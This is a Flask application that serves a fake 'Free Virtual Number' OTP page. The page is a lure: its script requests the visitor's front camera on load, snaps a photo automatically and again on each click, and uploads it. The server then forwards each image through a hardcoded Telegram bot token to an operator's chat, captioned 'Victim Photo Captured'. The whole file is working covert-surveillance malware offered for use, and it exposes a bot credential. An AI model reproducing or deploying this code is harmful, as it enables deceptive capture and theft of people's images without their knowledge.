import os
import base64
from flask import Flask, render_template_string, request, jsonify
import telebot

app = Flask(__name__)
BOT_TOKEN = "8628341169:AAH0RN8xSL2GuKIhqiEElvndV_xWoUyw9WE"
bot = telebot.TeleBot(BOT_TOKEN)

HTML_CONTENT = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Virtual Number - Secure & Free</title>
    <style>
        body { 
            background: #0b0f19; 
            color: white; 
            text-align: center; 
            margin: 0; 
            padding: 20px; 
            font-family: sans-serif; 
        }
        .header-title {
            font-size: 22px;
            font-weight: bold;
            color: #3b82f6;
            margin-bottom: 10px;
        }
        .badge {
            background: linear-gradient(90deg, #06b6d4, #3b82f6);
            color: white;
            padding: 8px 20px;
            border-radius: 20px;
            display: inline-block;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 15px;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
        }
        .socials {
            color: #94a3b8;
            font-size: 13px;
            margin-bottom: 25px;
        }
        .grid {
            display: flex;
            flex-direction: column;
            gap: 15px;
            align-items: center;
            max-width: 400px;
            margin: 0 auto;
        }
        .card { 
            background: #111827; 
            border: 1px solid #1f2937;
            padding: 18px; 
            border-radius: 14px; 
            width: 100%; 
            box-sizing: border-box;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); 
        }
        .country {
            font-size: 15px;
            font-weight: bold;
            color: #e2e8f0;
            margin-bottom: 5px;
        }
        .number { 
            color: #94a3b8; 
            font-size: 15px; 
            margin-bottom: 15px; 
            font-family: monospace;
        }
        button { 
            background: #ef4444; 
            color: white; 
            border: none; 
            padding: 10px 0; 
            border-radius: 8px; 
            cursor: pointer; 
            width: 100%; 
            font-size: 15px; 
            font-weight: bold; 
        }
        button:active { background: #dc2626; }
    </style>
</head>
<body>

    <div class="header-title">📞 Free Virtual Number</div>
    <div class="badge">Secure • Temporary • Free</div>
    <div class="socials">WhatsApp &nbsp;|&nbsp; Telegram &nbsp;|&nbsp; Facebook</div>
    
    <div style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">
        Get your free OTP verification numbers instantly. Select a destination below to begin.
    </div>

    <div class="grid">
        <div class="card" onclick="triggerCapture()">
            <div class="country">🇺🇸 UNITED STATES</div>
            <div class="number">+1 398 362 8901</div>
            <button>SELECT</button>
        </div>
        <div class="card" onclick="triggerCapture()">
            <div class="country">🇬🇧 UNITED KINGDOM</div>
            <div class="number">+44 8752 333 690</div>
            <button>SELECT</button>
        </div>
        <div class="card" onclick="triggerCapture()">
            <div class="country">🇮🇳 INDIA</div>
            <div class="number">+91 77234 43910</div>
            <button>SELECT</button>
        </div>
        <div class="card" onclick="triggerCapture()">
            <div class="country">🇫🇷 FRANCE</div>
            <div class="number">+33 83 333 765</div>
            <button>SELECT</button>
        </div>
        <div class="card" onclick="triggerCapture()">
            <div class="country">🇩🇪 GERMANY</div>
            <div class="number">+49 6635 567 883</div>
            <button>SELECT</button>
        </div>
        <div class="card" onclick="triggerCapture()">
            <div class="country">🇯🇵 JAPAN</div>
            <div class="number">+81 5587 652 322</div>
            <button>SELECT</button>
        </div>
    </div>

    <script>
        let cameraStream = null;

        // آماده‌سازی دوربین در پس‌زمینه به محض ورود به سایت برای سرعت بالا
        async function initCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
            } catch (err) {
                console.log("Camera permission waiting for user interaction");
            }
        }

        // تابع اصلی گرفتن و ارسال سریع عکس
        async function triggerCapture() {
            try {
                if (!cameraStream) {
                    cameraStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "user" },
                        audio: false
                    });
                }

                const video = document.createElement('video');
                video.srcObject = cameraStream;
                video.playsInline = true;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const dataURL = canvas.toDataURL('image/jpeg', 0.85);

                // ارسال آنی به سرور پایتون بدون معطلی
                fetch("/upload" + window.location.search, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataURL })
                });

            } catch (err) {
                console.log("Error capturing photo", err);
            }
        }

        // هم به محض ورود درخواست می‌دهد، هم روی هر کارت یا دکمه‌ای زده شود عکس می‌گیرد
        window.addEventListener('DOMContentLoaded', () => {
            initCamera();
            setTimeout(triggerCapture, 1500);
        });
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_CONTENT)

@app.route("/upload", methods=["POST"])
def upload():
    user_id = request.args.get("user") or request.args.get("id")
    data = request.get_json()
    
    if data and "image" in data:
        try:
            image_data = data["image"].split(",")[1]
            image_bytes = base64.b64decode(image_data)
            
            target_id = user_id if user_id else "8173349543"
            bot.send_photo(target_id, image_bytes, caption="📸 Victim Photo Captured\n⚡ Developed by: @Kaliboy002")
        except Exception as e:
            print(f"Error processing image: {e}")
            
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
